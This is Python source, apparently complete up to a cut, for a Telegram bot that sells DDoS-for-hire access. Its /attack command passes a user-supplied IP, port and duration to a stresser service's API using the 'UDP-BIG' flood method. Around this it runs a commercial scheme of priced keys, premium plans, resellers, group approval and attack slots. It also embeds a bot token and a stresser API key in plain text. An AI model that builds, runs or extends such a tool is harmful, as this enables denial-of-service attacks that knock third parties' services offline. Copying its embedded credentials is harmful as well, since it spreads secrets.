import os
import json
import time
import random
import threading
import requests
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler

# ======================== FLASK APP ============================
app = Flask(__name__)

# ======================== CONFIG ============================
BOT_TOKEN = "8941070109:AAGeOOfgnYfn8G8Yv7XwWhPC1w90tKheThQ"
ADMIN_ID = 6548871396

# API Configuration
API_URL = "https://retrostress.net/api/start"
API_KEY = "6378cea5c08195f4c92db7b8fe80966daa91cc20f5eb3fda160a815d86c9f348"
API_METHOD = "UDP-BIG"

# Group Settings
GROUP_ATTACK_TIME = 120
GROUP_COOLDOWN = 60

# Plan Settings
PLAN_SETTINGS = {
    'basic': {
        'max_time': 300,
        'cooldown': 60,
        'daily_limit': 0,
        'price_multiplier': 1,
        'label': 'BASIC',
        'emoji': '📀',
        'prefix': 'TRX'
    },
    'premium': {
        'max_time': 600,
        'cooldown': 0,
        'daily_limit': 0,
        'price_multiplier': 2,
        'label': 'PREMIUM',
        'emoji': '🌟',
        'prefix': 'VIP'
    }
}

# Files
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
GROUPS_FILE = "groups.json"
RESELLERS_FILE = "resellers.json"
BLOCKED_KEYS_FILE = "blocked_keys.json"
SETTINGS_FILE = "settings.json"

# Default settings
attack_time = 300
MAX_SLOTS = 8
cooldown_seconds = 30
attack_daily_limit = 0
is_locked = False

# Load data
def load_json(file, default):
    if os.path.exists(file):
        with open(file, 'r') as f:
            return json.load(f)
    return default

def save_json(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

keys = load_json(KEYS_FILE, {})
users = load_json(USERS_FILE, {})
groups = load_json(GROUPS_FILE, {})
resellers = load_json(RESELLERS_FILE, {})
blocked_keys = load_json(BLOCKED_KEYS_FILE, {})
settings = load_json(SETTINGS_FILE, {
    'attack_time': 300,
    'MAX_SLOTS': 8,
    'cooldown_seconds': 30,
    'attack_daily_limit': 0,
    'is_locked': False
})

attack_time = settings['attack_time']
MAX_SLOTS = settings['MAX_SLOTS']
cooldown_seconds = settings['cooldown_seconds']
attack_daily_limit = settings['attack_daily_limit']
is_locked = settings['is_locked']

# Attack tracking
active_attacks = {}
user_cooldowns = {}
daily_attacks = {}
group_cooldowns = {}
status_threads = {}

# KEY PRICES
KEY_PRICES = {
    "1h": {"basic": 1, "premium": 2},
    "12h": {"basic": 2, "premium": 4},
    "1d": {"basic": 4, "premium": 8},
    "3d": {"basic": 8, "premium": 16},
    "7d": {"basic": 15, "premium": 30},
    "14d": {"basic": 30, "premium": 60},
    "30d": {"basic": 50, "premium": 100}
}

# ======================== HELPERS ============================

def generate_key_string(prefix="VIP"):
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return f"{prefix}-{''.join(random.choices(chars, k=10))}"

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_user_plan(user_id):
    user_id = str(user_id)
    if user_id not in users:
        return None
    return users[user_id].get('plan', 'basic')

def get_user_plan_settings(user_id):
    plan = get_user_plan(user_id)
    if plan and plan in PLAN_SETTINGS:
        return PLAN_SETTINGS[plan]
    return PLAN_SETTINGS['basic']

def is_user(user_id):
    user_id = str(user_id)
    if user_id not in users:
        return False
    expiry = users[user_id].get('expiry')
    if expiry:
        if datetime.now() > datetime.fromisoformat(expiry):
            return False
    return True

def is_reseller(user_id):
    user_id = str(user_id)
    if user_id not in resellers:
        return False
    return True

def is_group(chat_id):
    chat_id = str(chat_id)
    if chat_id not in groups:
        return False
    expiry = groups[chat_id].get('expiry')
    if expiry:
        if datetime.now() > datetime.fromisoformat(expiry):
            return False
    return True

def is_key_blocked(key):
    return key in blocked_keys

def add_user(user_id, days, hours=0, plan='basic'):
    user_id = str(user_id)
    expiry = datetime.now() + timedelta(days=days, hours=hours)
    users[user_id] = {
        'expiry': expiry.isoformat(),
        'plan': plan
    }
    save_json(USERS_FILE, users)

def remove_user(user_id):
    user_id = str(user_id)
    if user_id in users:
        del users[user_id]
        save_json(USERS_FILE, users)

def add_group(group_id, days):
    group_id = str(group_id)
    expiry = datetime.now() + timedelta(days=days)
    groups[group_id] = {'expiry': expiry.isoformat()}
    save_json(GROUPS_FILE, groups)

def remove_group(group_id):
    group_id = str(group_id)
    if group_id in groups:
        del groups[group_id]
        save_json(GROUPS_FILE, groups)

def add_reseller(user_id, tokens, unlimited=False):
    user_id = str(user_id)
    resellers[user_id] = {
        'tokens': tokens,
        'unlimited': unlimited,
        'total_earned': 0,
        'keys_generated': []
    }
    save_json(RESELLERS_FILE, resellers)

def remove_reseller(user_id):
    user_id = str(user_id)
    if user_id in resellers:
        del resellers[user_id]
        save_json(RESELLERS_FILE, resellers)

def get_reseller_tokens(user_id):
    user_id = str(user_id)
    if user_id in resellers:
        if resellers[user_id].get('unlimited', False):
            return "∞"
        return resellers[user_id].get('tokens', 0)
    return 0

def get_reseller_keys(user_id):
    user_id = str(user_id)
    if user_id in resellers:
        return resellers[user_id].get('keys_generated', [])
    return []

def generate_reseller_key(user_id, duration, plan='basic'):
    user_id = str(user_id)
    price = KEY_PRICES.get(duration, {}).get(plan, 0)
    
    if not resellers[user_id].get('unlimited', False):
        if resellers[user_id].get('tokens', 0) < price:
            return None, f"❌ Insufficient tokens! Need {price} tokens."
    
    prefix = PLAN_SETTINGS.get(plan, PLAN_SETTINGS['basic'])['prefix']
    key = generate_key_string(prefix)
    
    days, hours = 0, 0
    if duration.endswith('h'):
        hours = int(duration[:-1])
    elif duration.endswith('d'):
        days = int(duration[:-1])
    
    keys[key] = {
        'created_by': user_id,
        'days': days,
        'hours': hours,
        'plan': plan,
        'used': False,
        'used_by': None,
        'used_by_name': None,
        'created_at': datetime.now().isoformat()
    }
    
    if not resellers[user_id].get('unlimited', False):
        resellers[user_id]['tokens'] -= price
    resellers[user_id]['keys_generated'].append(key)
    resellers[user_id]['total_earned'] = resellers[user_id].get('total_earned', 0) + price
    
    save_json(KEYS_FILE, keys)
    save_json(RESELLERS_FILE, resellers)
    
    return key, None

def generate_admin_keys(prefix, days, hours, plan, count):
    generated_keys = []
    for _ in range(count):
        key = generate_key_string(prefix)
        keys[key] = {
            'created_by': 'admin',
            'days': days,
            'hours': hours,
            'plan': plan,
            'used': False,
            'used_by': None,
            'used_by_name': None,
            'created_at': datetime.now().isoformat()
        }
        generated_keys.append(key)
    save_json(KEYS_FILE, keys)
    return generated_keys

def delete_key(key):
    if key in keys:
        del keys[key]
        save_json(KEYS_FILE, keys)
        return True
    return False

def add_blocked_key(created_by, key, blocked_by="admin"):
    blocked_keys[key] = {
        'created_by': created_by,
        'blocked_by': blocked_by,
        'blocked_at': datetime.now().isoformat()
    }
    save_json(BLOCKED_KEYS_FILE, blocked_keys)

def remove_blocked_key(key):
    if key in blocked_keys:
        del blocked_keys[key]
        save_json(BLOCKED_KEYS_FILE, blocked_keys)

def get_reseller_blocked_keys(user_id):
    user_id = str(user_id)
    return [k for k, v in blocked_keys.items() if v.get('created_by') == user_id]

def get_slots():
    return MAX_SLOTS - len(active_attacks)

def add_attack_count(user_id):
    user_id = str(user_id)
    today = datetime.now().date().isoformat()
    if user_id not in daily_attacks:
        daily_attacks[user_id] = {}
    if today not in daily_attacks[user_id]:
        daily_attacks[user_id][today] = 0
    daily_attacks[user_id][today] += 1

def can_attack(user_id, chat_id=None):
    user_id = str(user_id)
    
    if chat_id and chat_id < 0:
        if not is_group(chat_id):
            return False, "❌ Group Not Approved! Contact Admin."
        if str(chat_id) in group_cooldowns:
            remaining = group_cooldowns[str(chat_id)] - time.time()
            if remaining > 0:
                return False, f"⏳ Group cooldown: {int(remaining)}s remaining"
        return True, "OK"
    
    if not is_user(user_id) and not is_reseller(user_id) and not is_admin(int(user_id)):
        return False, "❌ Not approved! Use /redeem KEY"
    
    plan_settings = get_user_plan_settings(user_id)
    user_daily_limit = plan_settings.get('daily_limit', 0)
    
    if user_daily_limit > 0 and not is_admin(int(user_id)):
        today = datetime.now().date().isoformat()
        count = daily_attacks.get(user_id, {}).get(today, 0)
        if count >= user_daily_limit:
            return False, f"❌ Daily limit reached! ({user_daily_limit})"
    
    if user_id in user_cooldowns:
        remaining = user_cooldowns[user_id] - time.time()
        if remaining > 0:
            return False, f"⏳ Cooldown: {int(remaining)}s remaining"
    
    return True, "OK"

def set_cooldown(user_id, chat_id=None):
    if chat_id and chat_id < 0:
        group_cooldowns[str(chat_id)] = time.time() + GROUP_COOLDOWN
    else:
        plan_settings = get_user_plan_settings(user_id)
        cooldown = plan_settings.get('cooldown', 60)
        user_cooldowns[str(user_id)] = time.time() + cooldown

def send_api_attack(ip, port, duration):
    url = f"{API_URL}?key={API_KEY}&target={ip}&port={port}&time={duration}&method={API_METHOD}"
    try:
        response = requests.get(url, timeout=10)
        return response.json()
    except Exception as e:
        return {"success": False, "error": str(e)}

def get_status_message(chat_id, user_id):
    active_count = len(active_attacks)
    
    if active_count == 0:
        return f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Active Attacks: 0/{MAX_SLOTS}

No active attacks.

⚙️ Settings:
Concurrent = {MAX_SLOTS}
Max Time = {attack_time}s
Group Max Time = {GROUP_ATTACK_TIME}s
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    status_lines = []
    for idx, (attack_key, attack) in enumerate(active_attacks.items(), 1):
        elapsed = int(time.time() - attack['start_time'])
        remaining = max(0, attack['duration'] - elapsed)
        percent = int((elapsed / attack['duration']) * 100) if attack['duration'] > 0 else 0
        if percent > 100:
            percent = 100
        bar = "█" * int(percent/5) + "▒" * (20 - int(percent/5))
        attack_type = "Group" if attack.get('is_group', False) else "Private"
        status_lines.append(f"- {attack['ip']}:{attack['port']} ({remaining}s) by {attack['user_id']} {attack_type}")
        status_lines.append(f"  {bar} {percent}%")
    
    cooldown_remaining = 0
    if chat_id < 0 and str(chat_id) in group_cooldowns:
        cooldown_remaining = max(0, group_cooldowns[str(chat_id)] - time.time())
    elif str(user_id) in user_cooldowns:
        cooldown_remaining = max(0, user_cooldowns[str(user_id)] - time.time())
    
    return f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Active Attacks: {active_count}/{MAX_SLOTS}

{chr(10).join(status_lines)}

⚙️ Settings:
Concurrent = {MAX_SLOTS}
Max Time = {attack_time}s
Group Max Time = {GROUP_ATTACK_TIME}s

⏳ Your Cooldown: {int(cooldown_remaining)}s remaining
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

# ======================== STATUS UPDATE THREAD ============================

def start_status_updater(chat_id, user_id, message_id):
    thread_key = f"{chat_id}_{user_id}"
    
    if thread_key in status_threads:
        status_threads[thread_key] = False
        time.sleep(0.5)
    
    status_threads[thread_key] = True
    threading.Thread(target=status_updater_loop, args=(chat_id, user_id, message_id, thread_key), daemon=True).start()

def status_updater_loop(chat_id, user_id, message_id, thread_key):
    last_text = ""
    consecutive_errors = 0
    
    while status_threads.get(thread_key, False):
        try:
            if len(active_attacks) == 0:
                status_threads[thread_key] = False
                break
            
            new_text = get_status_message(chat_id, user_id)
            if new_text != last_text:
                try:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
                                json={
                                    "chat_id": chat_id,
                                    "message_id": message_id,
                                    "text": new_text
                                })
                    last_text = new_text
                    consecutive_errors = 0
                except Exception as e:
                    consecutive_errors += 1
                    if consecutive_errors > 5:
                        break
            
            time.sleep(0.5)
            
        except Exception as e:
            consecutive_errors += 1
            if consecutive_errors > 10:
                break
            time.sleep(1)
    
    if thread_key in status_threads:
        del status_threads[thread_key]

# ======================== TELEGRAM HANDLERS ============================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if chat_id < 0:
        if not is_group(chat_id):
            msg = """
❌ Group Not Approved!

Contact Admin to get approval.
"""
            await update.message.reply_text(msg)
            return
        
        msg = """
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Group Attack Bot Active!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 /attack <ip> <port> <time> – Start attack
📊 /status – View active attacks
❓ /help – Help menu
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Group Settings:
⏱️ Max Time: 120s
🥶 Cooldown: 60s
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        await update.message.reply_text(msg)
        return
    
    if not is_user(user_id) and not is_reseller(user_id) and not is_admin(user_id):
        msg = """
👋 Hello! This bot requires authorization.

Use /redeem if you have a code, or join an authorized group.
"""
        await update.message.reply_text(msg)
        return
    
    msg = """
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Welcome! You have an active plan.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 /attack <ip> <port> <time> – Start attack
📊 /status – View active attacks
🏓 /ping – Check bot latency
🆔 /id – Get your Telegram ID
🔑 /redeem <code> – Redeem a key
📋 /check_my_access – View your plan
❓ /help – Help menu
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    await update.message.reply_text(msg)

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_locked
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    args = context.args
    
    if is_locked and not is_admin(user_id):
        await update.message.reply_text("🔒 Bot is locked!")
        return
    
    if chat_id < 0:
        if not is_group(chat_id):
            await update.message.reply_text("❌ Group Not Approved! Contact Admin.")
            return
        
        if len(active_attacks) >= MAX_SLOTS:
            await update.message.reply_text(f"⚠️ All {MAX_SLOTS} slots are busy! Please wait.")
            return
        
        if len(args) != 3:
            await update.message.reply_text("Usage: /attack IP PORT TIME")
            return
        
        ip = args[0]
        try:
            port = int(args[1])
            sec = int(args[2])
        except ValueError:
            await update.message.reply_text("❌ Invalid port or time! Use numbers only.")
            return
        
        if sec < 1:
            sec = 1
        if sec > GROUP_ATTACK_TIME:
            await update.message.reply_text(f"❌ Max duration is {GROUP_ATTACK_TIME}s! You sent {sec}s")
            return
        
        can, msg = can_attack(user_id, chat_id)
        if not can:
            await update.message.reply_text(msg)
            return
        
        await start_attack(update, chat_id, ip, port, sec, user_id, is_group=True)
        return
    
    if not is_user(user_id) and not is_reseller(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Not approved! Use /redeem KEY")
        return
    
    can, msg = can_attack(user_id)
    if not can:
        await update.message.reply_text(msg)
        return
    
    if len(active_attacks) >= MAX_SLOTS:
        await update.message.reply_text(f"⚠️ All {MAX_SLOTS} slots are busy! Please wait.")
        return
    
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack IP PORT TIME")
        return
    
    ip = args[0]
    try:
        port = int(args[1])
        sec = int(args[2])
    except ValueError:
        await update.message.reply_text("❌ Invalid port or time! Use numbers only.")
        return
    
    if sec < 1:
        sec = 1
    
    plan_settings = get_user_plan_settings(user_id)
    user_max_time = plan_settings.get('max_time', 300)
    
    if sec > user_max_time:
        await update.message.reply_text(f"❌ Max duration is {user_max_time}s! You sent {sec}s")
        return
    
    await start_attack(update, chat_id, ip, port, sec, user_id, is_group=False)

async def start_attack(update, chat_id, ip, port, sec, user_id, is_group=False):
    result = send_api_attack(ip, port, sec)
    
    if not result.get('success', False):
        error_msg = result.get('error', 'Unknown error')
        await update.message.reply_text(f"❌ Attack failed: {error_msg}")
        return
    
    attack_id = result.get('data', {}).get('id', 'N/A')
    
    attack_key = f"{chat_id}_{user_id}_{int(time.time())}"
    active_attacks[attack_key] = {
        'ip': ip,
        'port': port,
        'duration': sec,
        'start_time': time.time(),
        'attack_id': attack_id,
        'chat_id': chat_id,
        'user_id': user_id,
        'is_group': is_group
    }
    
    add_attack_count(user_id)
    set_cooldown(user_id, chat_id)
    
    if is_group:
        msg = f"""
━━━━━━━━━━━━━━━━━━━━━
⚡ Attack Started!
━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}:{port}
⏱️ Time: {sec}s
👥 Group Attack
━━━━━━━━━━━━━━━━━━━━━
📊 Use /status to check progress
━━━━━━━━━━━━━━━━━━━━━
"""
    else:
        msg = f"""
━━━━━━━━━━━━━━━━━━━━━
⚡ Attack Started!
━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}:{port}
⏱️ Time: {sec}s
━━━━━━━━━━━━━━━━━━━━━
📊 Use /status to check progress
━━━━━━━━━━━━━━━━━━━━━
"""
    await update.message.reply_text(msg)
    
    threading.Thread(target=attack_timer, args=(attack_key, sec, chat_id, ip, port, user_id), daemon=True).start()

def attack_timer(attack_key, duration, chat_id, ip, port, user_id):
    time.sleep(duration)
    
    if attack_key in active_attacks:
        del active_attacks[attack_key]
        
        plan_settings = get_user_plan_settings(user_id)
        cooldown = plan_settings.get('cooldown', 60)
        
        try:
            complete_msg = f"""
━━━━━━━━━━━━━━━━━━━━━
✅ Attack Complete!
━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}:{port}
⏱️ Duration: {duration}s
🥶 Cooldown: {cooldown}s
━━━━━━━━━━━━━━━━━━━━━
"""
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                         json={"chat_id": chat_id, "text": complete_msg})
        except:
            pass

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if chat_id < 0:
        if not is_group(chat_id):
            await update.message.reply_text("❌ Group Not Approved! Contact Admin.")
            return
    
    if len(active_attacks) == 0:
        msg = get_status_message(chat_id, user_id)
        await update.message.reply_text(msg)
        return
    
    msg = get_status_message(chat_id, user_id)
    sent_msg = await update.message.reply_text(msg)
    
    start_status_updater(chat_id, user_id, sent_msg.message_id)

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start = time.time()
    await update.message.reply_text("🏓 Pinging...")
    end = time.time()
    await update.message.reply_text(f"🏓 Pong! {int((end-start)*1000)}ms")

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    msg = f"""
🆔 Your ID: {user_id}
📢 Chat ID: {chat_id}
"""
    await update.message.reply_text(msg)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    args = context.args
    
    if not args:
        await update.message.reply_text("⚠️ Usage: /redeem <code>")
        return
    
    key = args[0].upper()
    
    if is_key_blocked(key):
        await update.message.reply_text("🚫 This key has been blocked!")
        return
    
    if key not in keys:
        await update.message.reply_text("❌ Invalid key! Please check and try again.")
        return
    
    if keys[key].get('used', False):
        await update.message.reply_text("❌ This key has already been used!")
        return
    
    days = keys[key].get('days', 0)
    hours = keys[key].get('hours', 0)
    plan = keys[key].get('plan', 'basic')
    
    keys[key]['used'] = True
    keys[key]['used_by'] = user_id
    keys[key]['used_by_name'] = update.effective_user.full_name or update.effective_user.username or user_id
    save_json(KEYS_FILE, keys)
    
    add_user(user_id, days, hours, plan)
    
    plan_settings = PLAN_SETTINGS.get(plan, PLAN_SETTINGS['basic'])
    expiry = users[user_id].get('expiry', 'N/A')
    
    if plan == 'premium':
        msg = f"""
✅ Key Redeemed Successfully!
━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Plan: Premium
📅 Expiry: {expiry}
━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Max Time: 600s
❄️ Cooldown: 0s
🎯 Unlimited Attacks
━━━━━━━━━━━━━━━━━━━━━━━━
You can now use /attack in private chat.
"""
    else:
        msg = f"""
✅ Key Redeemed Successfully!
━━━━━━━━━━━━━━━━━━━━━━━━
📀 Plan: Basic
📅 Expiry: {expiry}
━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Max Time: 300s
❄️ Cooldown: 60s
🎯 Unlimited Attacks
━━━━━━━━━━━━━━━━━━━━━━━━
You can now use /attack in private chat.
"""
    
    await update.message.reply_text(msg)

async def check_my_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if is_admin(int(user_id)):
        msg = """
📋 Your Access:
👑 Admin
"""
    elif is_reseller(user_id):
        tokens = get_reseller_tokens(user_id)
        keys_gen = get_reseller_keys(user_id)
        blocked = get_reseller_blocked_keys(user_id)
        msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📋 Your Access:
💼 Reseller
💰 Tokens: {tokens}
🔑 Keys Generated: {len(keys_gen)}
🚫 Blocked Keys: {len(blocked)}
━━━━━━━━━━━━━━━━━━━━━━━━
"""
    elif is_user(user_id):
        expiry = users[user_id].get('expiry', 'N/A')
        user_plan = users[user_id].get('plan', 'basic')
        plan_settings = PLAN_SETTINGS.get(user_plan, PLAN_SETTINGS['basic'])
        status = "✅ Active" if datetime.now() < datetime.fromisoformat(expiry) else "❌ Expired"
        msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 Your Access:
👤 User
📅 Expiry: {expiry}
📊 Status: {status}
📀 Plan: {plan_settings['label']}
⚡ Max Time: {plan_settings['max_time']}s
❄️ Cooldown: {plan_settings['cooldown']}s
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    else:
        msg = "📋 Your Access:\n❌ No access"
    
    await update.message.reply_text(msg)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if chat_id < 0:
        if not is_group(chat_id):
            await update.message.reply_text("❌ Group Not Approved! Contact Admin.")
            return
        
        msg = """
━━━━━━━━━━━━━━━━━━━━━━━━
❓ Group Help Menu
━━━━━━━━━━━━━━━━━━━━━━━━
/attack <ip> <port> <time> - Start Attack
/status - Live Attack Status
/ping - Check Bot Latency
/id - Get Your ID
/help - This Menu
━━━━━━━━━━━━━━━━━━━━━━━━
Group Settings:
⏱️ Max Time: 120s
🥶 Cooldown: 60s
━━━━━━━━━━━━━━━━━━━━━━━━
"""
        await update.message.reply_text(msg)
        return
    
    if is_admin(user_id):
        msg = """
━━━━━━━━━━━━━━━━━━━━━━━━
👑 ADMIN COMMANDS:             
/adduser ID DAYS PLAN - Add User (basic/premium)
/removeuser ID - Remove User
/addgroup ID DAYS - Add Group
/removegroup ID - Remove Group
/setthreads NUM - Set Threads
/settime SEC - Set Max Time
/setslots NUM - Set Max Slots
/setcooldown SEC - Set Cooldown
/setdaily LIMIT - Set Daily Attack Limit
/gen PREFIX PLAN DURATION COUNT - Generate Keys
/keys - List All Keys
/deletekeys - Delete Keys
/addreseller ID TOKENS - Add Reseller
/removereseller ID - Remove Reseller
/resellers - List Resellers
/blockkey KEY - Block Key
/unblockkey KEY - Unblock Key
/lock - Lock Bot
/unlock - Unlock Bot
/unlimited ID - Make Reseller Unlimited
/limited ID TOKENS - Make Reseller Limited
/stop - Stop Attack (Admin Only)
━━━━━━━━━━━━━━━━━━━━━━━━
"""
    elif is_reseller(user_id):
        tokens = get_reseller_tokens(user_id)
        keys_gen = get_reseller_keys(user_id)
        blocked = get_reseller_blocked_keys(user_id)
        msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
  ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
  💼 RESELLER PANEL                  
  🎫 Tokens: {tokens}
  🔑 Keys Generated: {len(keys_gen)}
  🚫 Blocked Keys: {len(blocked)}
━━━━━━━━━━━━━━━━━━━━━━━━
📌 COMMANDS:                      
⚔️ ATTACK:
/attack IP PORT TIME - Start Attack
━━━━━━━━━━━━━━━━━━━━━━━━
👤 USER:
/id - Get Your ID
/redeem KEY - Redeem Access Key
/check_my_access - View Your Plan
/help - Help Menu
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 KEY MANAGEMENT:
/genkey - Generate Keys
/deletekey - Delete Your Keys
/blockkey KEY - Block Your Key
/unblockkey KEY - Unblock Your Key
/myblockedkeys - Show Your Blocked Keys
━━━━━━━━━━━━━━━━━━━━━━━━
"""
    else:
        msg = """
━━━━━━━━━━━━━━━━━━━━━━━━
❓ Help Menu
━━━━━━━━━━━━━━━━━━━━━━━━
/attack <ip> <port> <time> - Start Attack
/status - Live Attack Status
/ping - Check Bot Latency
/id - Get Your ID
/redeem <code> - Redeem Key
/check_my_access - View Your Plan
/help - This Menu
━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    await update.message.reply_text(msg)

# ======================== ADMIN COMMANDS ============================

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(active_attacks) > 0:
        active_attacks.clear()
        for key in list(status_threads.keys()):
            status_threads[key] = False
        await update.message.reply_text("🛑 All attacks stopped!")
    else:
        await update.message.reply_text("❌ No active attack!")

async def adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) < 2:
        await update.message.reply_text("Usage: /adduser ID DAYS [plan]")
        return
    
    plan = 'basic'
    if len(args) >= 3:
        plan = args[2].lower()
        if plan not in ['basic', 'premium']:
            plan = 'basic'
    
    add_user(int(args[0]), int(args[1]), 0, plan)
    await update.message.reply_text(f"✅ User {args[0]} added for {args[1]} days!")

async def removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /removeuser ID")
        return
    
    remove_user(args[0])
    await update.message.reply_text("✅ User removed!")

async def addgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 2:
        await update.message.reply_text("Usage: /addgroup ID DAYS")
        return
    
    add_group(args[0], int(args[1]))
    await update.message.reply_text(f"✅ Group {args[0]} added for {args[1]} days!")

async def removegroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /removegroup ID")
        return
    
    remove_group(args[0])
    await update.message.reply_text("✅ Group removed!")

async def setthreads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /setthreads NUM")
        return
    
    await update.message.reply_text(f"✅ Threads set to {args[0]} (API mode)")

async def settime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_time
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return    
    if len(args) != 1:
        await update.message.reply_text("Usage: /settime SEC")
        return
    
    attack_time = int(args[0])
    if attack_time < 1:
        attack_time = 1
    if attack_time > 600:
        attack_time = 600
    settings['attack_time'] = attack_time
    save_json(SETTINGS_FILE, settings)
    await update.message.reply_text(f"✅ Max time set to {attack_time}s")

async def setslots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global MAX_SLOTS
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /setslots NUM")
        return
    
    MAX_SLOTS = int(args[0])
    if MAX_SLOTS < 1:
        MAX_SLOTS = 1
    if MAX_SLOTS > 200:
        MAX_SLOTS = 200
    settings['MAX_SLOTS'] = MAX_SLOTS
    save_json(SETTINGS_FILE, settings)
    await update.message.reply_text(f"✅ Max slots set to {MAX_SLOTS}")

async def setcooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global cooldown_seconds
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /setcooldown SECONDS")
        return
    
    cooldown_seconds = int(args[0])
    if cooldown_seconds < 0:
        cooldown_seconds = 0
    if cooldown_seconds > 600:
        cooldown_seconds = 600
    settings['cooldown_seconds'] = cooldown_seconds
    save_json(SETTINGS_FILE, settings)
    await update.message.reply_text(f"✅ Cooldown set to {cooldown_seconds}s")

async def setdaily(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_daily_limit
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /setdaily LIMIT")
        return
    
    attack_daily_limit = int(args[0])
    if attack_daily_limit < 0:
        attack_daily_limit = 0
    if attack_daily_limit > 1000:
        attack_daily_limit = 1000
    settings['attack_daily_limit'] = attack_daily_limit
    save_json(SETTINGS_FILE, settings)
    await update.message.reply_text(f"✅ Daily limit set to {attack_daily_limit}")

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) < 4:
        await update.message.reply_text("""
Usage: /gen PREFIX PLAN DURATION COUNT

Example:
/gen VIP basic 30d 5
/gen VIP premium 7d 10

Plans: basic, premium
Duration: 1h, 12h, 1d, 3d, 7d, 14d, 30d
""")
        return
    
    prefix = args[0].upper()
    plan = args[1].lower()
    duration = args[2].lower()
    
    try:
        count = int(args[3])
        if count < 1:
            count = 1
        if count > 50:
            count = 50
    except ValueError:
        await update.message.reply_text("❌ Count must be a number!")
        return
    
    if plan not in ['basic', 'premium']:
